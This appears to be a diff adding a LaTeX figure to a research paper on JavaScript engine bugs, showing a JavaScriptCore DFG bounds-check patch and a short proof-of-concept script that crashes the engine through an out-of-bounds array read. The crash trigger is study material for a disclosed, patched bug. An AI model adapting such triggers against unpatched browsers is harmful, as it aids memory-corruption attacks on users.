@@ -1,0 +1,89 @@
+% https://trac.webkit.org/changeset/241228/webkit/trunk/Source/JavaScriptCore/dfg/DFGSSALoweringPhase.cpp
+% https://bugs.chromium.org/p/project-zero/issues/detail?id=1775
+\begin{figure*}[t]
+    \begin{center}\vspace{-2em}
+        \begin{lstlisting}[style=JSC++, caption=JavaScriptCore: Out-Of-Bounds Read/Write From Improper Bounds Speculazation]
+// Source/JavaScriptCore/dfg/DFGSSALoweringPhase.cpp
+namespace JSC { namespace DFG {
+class SSALoweringPhase : public Phase {
+    static const bool verbose = false;
+   
+public:
+    SSALoweringPhase(Graph& graph)
+        : Phase(graph, "SSA lowering")
+        , m_insertionSet(graph)
+    {
+    }
+   
+    bool run()
+        ...
+    
+private:
+    void handleNode()
+        ... 
+   
+    bool lowerBoundsCheck(Edge base, Edge index, Edge storage)
+    {
+        if (!m_node->arrayMode().permitsBoundsCheckLowering())
+            return false;
+       
+        if (!m_node->arrayMode().lengthNeedsStorage())
+            storage = Edge();
+       
+        NodeType op = GetArrayLength;
+        switch (m_node->arrayMode().type()) {
+        case Array::ArrayStorage:
+        case Array::SlowPutArrayStorage:
+            op = GetVectorLength;
+            break;
+        case Array::String:
+            // When we need to support this, it will require additional code
+            // since base's useKind is KnownStringUse.
+            DFG_CRASH(m_graph, m_node, "Array::String's base.useKind() is KnownStringUse");
+            break;
+        default:
+            break;
+        }
+        Node* length = m_insertionSet.insertNode(
+            m_nodeIndex, SpecInt32Only, op, m_node->origin,
+            OpInfo(m_node->arrayMode().asWord()), Edge(base.node(), KnownCellUse), storage);
+
+-       m_insertionSet.insertNode(
++       Node* checkInBounds = m_insertionSet.insertNode(
+            m_nodeIndex, SpecInt32Only, CheckInBounds, m_node->origin,
+            index, Edge(length, KnownInt32Use));
++
++       AdjacencyList adjacencyList = m_graph.copyVarargChildren(m_node);
++
++       m_graph.m_varArgChildren.append(Edge(checkInBounds, UntypedUse));
++       adjacencyList.setNumChildren(adjacencyList.numChildren() + 1);
++       m_node->children = adjacencyList;
+        return true;
+    }
+    ...   
+};
+\end{lstlisting}
+\end{center}\vspace{-2em}
+\begin{center}
+\begin{lstlisting}[style=JS,caption=PoC Crash]
+// xpl.js
+// Run with --thresholdForFTLOptimizeAfterWarmUp=1000
+const v3 = [1337,1337,1337,1337];
+const v6 = [1337,1337];
+
+function v7(v8) {
+    for (let v9 in v8) {
+        v8.a = 42;
+        const v10 = v8[-698666199];
+    }
+}
+
+while (true) {
+    const v14 = v7(v6);
+    const v15 = v7(1337);
+}
+\end{lstlisting}
+\end{center}
+\end{figure*}
+
+%===============================================================
